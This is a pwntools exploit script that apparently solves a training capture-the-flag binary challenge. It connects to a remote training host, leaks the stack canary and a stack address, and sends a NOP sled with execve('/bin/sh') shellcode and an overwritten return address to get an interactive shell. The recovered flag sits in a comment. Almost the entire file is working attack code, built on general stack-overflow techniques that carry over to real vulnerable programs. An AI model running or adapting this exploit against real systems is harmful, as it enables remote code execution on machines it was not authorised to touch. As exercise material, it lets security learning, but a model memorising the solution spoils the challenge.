from pwn import *
import time

#context.terminal = ['tmux', 'splitw', '-h']

r = remote("bin.training.jinblack.it", 2011)
#r = remote("127.0.0.1",  4000)

#r = process("./gonnaleak")
#gdb.attach(r, '''
#b *004011f0
#''')

#in order to make it work, I need to enter a space before inserting "ls"

#flag{you_can_also_leak_the_stack!}


#shellcode to put on the stack
shellcode = b"\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xE2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"

#time.sleep(3)
#input("press a key...")

#To find the canary, in the same way of the leakers challenge:
payload = 104 * b"a"
r.sendline(payload)
r.recvuntil(payload)

canary = u64(r.recv(8)) - 0xa
print(hex(canary))
#CANARY FOUND: the canary change at every execution


######### 
#Test the canary sending 104 byte + canary
#payload2 = payload + p64(canary)
#r.sendline(payload2) just to test
# It works because program stopped with exit code 0 
#############


# To find where to write the address:
#r.sendline(payload3 + cyclic(100))
# in ret there is: 61616163


#overwriting everything (the 0s in particular, to avoid the stop of the print function) to find the buffer address
#that I don't know, since there is ASLR

#I calculated there are 135 bytes to reach the first address on the stack that points to the stack itself
payload3 = 135 * b"a"
r.sendline(payload3)
r.recvuntil(payload3)
r.recv(1) #moves the pointer to read ahead the '\n' character
stack_address = u64(r.recv(8) + b"\x00\x00")
#since I saw, debugging in local, that the offset between the content of the address that points to the stack and the buffer address
#is 344, I know it will remain constant!
offset = 344
buffer_address = stack_address - offset
#print(hex(buffer_address))

#loading the nop sled and the shellcode to execute in the buffer: now I know its address, so I know where to jump!
nop_sled = (104 - len(shellcode)) * b"\x90"
payload4 = nop_sled + shellcode + p64(canary)

# Send 104 bytes + canary + put in ret the address 
# of stack buffer (where the shellcode is)
payload5 = payload4 + cyclic(cyclic_find(0x61616163))
#I don't jump to the start of the buffer address but after to avoid a problem with a byte that is not a nop instruction
fixed_buffer_address = buffer_address + 0x20
payload5 += p64(fixed_buffer_address)
r.sendline(payload5)

r.interactive()